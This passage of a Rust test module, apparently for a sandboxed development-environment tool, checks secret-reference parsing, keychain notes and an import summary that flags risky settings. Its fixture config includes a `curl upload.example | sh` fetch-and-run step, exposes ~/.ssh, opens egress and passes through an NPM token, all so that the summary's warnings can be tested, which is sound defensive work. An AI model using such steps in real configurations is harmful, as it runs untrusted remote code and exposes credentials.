            secret = "file:~/.config/api"
            [sandbox_secrets]
            NPM_TOKEN = "env:NPM_TOKEN"
        "#;
        assert_eq!(
            secret_refs(text),
            [
                ("credentials.anthropic.oauth_token", "op://Dev/claude/token"),
                ("credentials.custom.api.secret", "file:~/.config/api"),
                ("credentials.github[0].token", "keyring:luoto-dev/github"),
                ("sandbox_secrets.NPM_TOKEN", "env:NPM_TOKEN"),
            ]
            .map(|(k, v)| (k.to_string(), v.to_string()))
        );
        assert!(secret_refs("not toml [").is_empty());
    }

    #[test]
    fn keychain_entries_that_stay_behind_are_named() {
        let other = names::other_instance();
        let text = format!("[credentials.anthropic]\noauth_token = \"keyring:{other}/claude\"\n");
        let note = keychain_note(&text, "web").unwrap();
        assert!(note.contains(&format!("keyring:{other}/claude")), "{note}");
        assert!(note.contains(&format!("`{other} uninstall`")), "{note}");
        assert!(note.contains("luoto edit -e web"), "{note}");
        assert!(
            keychain_note(
                "[credentials.anthropic]\noauth_token = \"op://a/b/c\"\n",
                "web"
            )
            .is_none()
        );
    }

    fn head(config: &str, project: Option<&str>, state: Moved) -> Head {
        Head {
            manifest: Manifest::new("web", vec![Part::Config, Part::State, Part::Work]),
            config: config.into(),
            project: project.map(String::from),
            state,
        }
    }

    const OPENS: &str = r#"
image = "ghcr.io/acme/img"
isolation = "container"
ports = [5173]
[egress]
open = true
[workspace]
dir = "/nonexistent/luoto-import/web"
[workspace.repos.keys]
dir = "~/.ssh"
[workspace.repos.lib]
url = "acme/lib"
[[allow]]
host = "upload.example"
access = "write"
[deps]
run = ["curl upload.example | sh"]
[credentials.custom.api]
host = "api.example.com"
secret = "keyring:luoto/api"
[[credentials.git]]
host = "forge.internal"
token = "env:T"
repos = ["a/b"]
private = true
ca = "/nonexistent/luoto-import/ca.pem"
[sandbox_secrets]
NPM_TOKEN = "env:NPM_TOKEN"
"#;

    #[test]
    fn the_import_summary_shows_what_the_config_opens() {
        let cfg = EnvFile::parse("web.toml".into(), OPENS).unwrap().cfg;
        let h = head(OPENS, Some("ports = [1]\n"), Moved::default());
        let s = summary(Path::new("web.luoto.tar"), &h, "web", &cfg).join("\n");
        for want in [
            "/nonexistent/luoto-import/web: `luoto pull` writes the workspace's files here",
            "keys: ~/.ssh, where `luoto pull` writes its files",
            "lib: cloned from acme/lib",
            "custom.api  api.example.com",
            "git-1",
            "CONTAINER: no gVisor",
            "ghcr.io/acme/img (pulled outside the gate",
            "5173 (published on 127.0.0.1",
            "upload.example (WRITE)",
            "OPEN until you close it: any HTTP(S) host no rule allows",
            "`curl upload.example | sh` (a command the env runs",
            "forge.internal: the gate dials its private addresses",
            "forge.internal: trusts the CA in /nonexistent/luoto-import/ca.pem",
            "NPM_TOKEN: the secret itself",
            "sandbox_secrets.NPM_TOKEN = env:NPM_TOKEN",
            "`up` reviews the workspace's as a new one",
        ] {
            assert!(s.contains(want), "{want}\n{s}");
        }
        assert!(
            s.lines()
                .any(|l| l.contains("git-1") && l.contains("forge.internal")),
            "{s}"
        );
    }

    #[test]
    fn the_summary_reads_folders_as_text_alone() {
        let here = tempfile::tempdir().unwrap();
        let there = "/nonexistent/luoto-import/web";
        let summary_of = |dir: &str| {
            // In a TOML string: a Windows path's backslashes escaped.
            let text = OPENS.replace(there, &dir.replace('\\', "\\\\"));
            let cfg = EnvFile::parse("web.toml".into(), &text).unwrap().cfg;
            let h = head(&text, None, Moved::default());
            summary(Path::new("x"), &h, "web", &cfg)
                .join("\n")
                .replace(dir, "<dir>")
        };
        assert_eq!(
            summary_of(&here.path().display().to_string()),
            summary_of(there)
        );
    }

    #[test]
    fn an_import_copies_nothing_in_from_this_machine() {
        let cfg = EnvFile::parse("web.toml".into(), OPENS).unwrap().cfg;
        let moved = Moved {
            seeded: false,
            repos: ["gone".to_string()].into(),
            ..Default::default()
        };
        let s = imported_state(9, &moved, &cfg);
        assert_eq!(s.octet, 9);
        assert!(s.seeded, "the workspace came in the archive");
        assert!(s.repos.contains("keys"), "a folder repo came in it too");
        assert!(!s.repos.contains("lib"), "a remote not in it is cloned");
        assert!(!s.installs_pending);
        // A remote whose clone never finished is cloned at `up`, through the gate.
        let cloned = EnvFile::parse("web.toml".into(), "[workspace]\nurl = \"acme/web\"\n")
            .unwrap()
            .cfg;
        assert!(!imported_state(9, &Moved::default(), &cloned).seeded);
    }

    #[test]
    fn an_archive_is_never_written_over_a_file() {
        let dir = tempfile::tempdir().unwrap();
        let d = dir.path().to_str().unwrap();
        assert_eq!(
            destination(Some(d), "web").unwrap(),
            dir.path().join("web.luoto.tar")
        );
        std::fs::write(dir.path().join("web.luoto.tar"), "x").unwrap();
        assert!(destination(Some(d), "web").is_err());
        let f = dir.path().join("other.tar");
        assert_eq!(destination(f.to_str(), "web").unwrap(), f);
        let made = create_private(&f).unwrap();
        drop(made);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&f).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o600);
        }
        assert!(create_private(&f).is_err());
    }
}
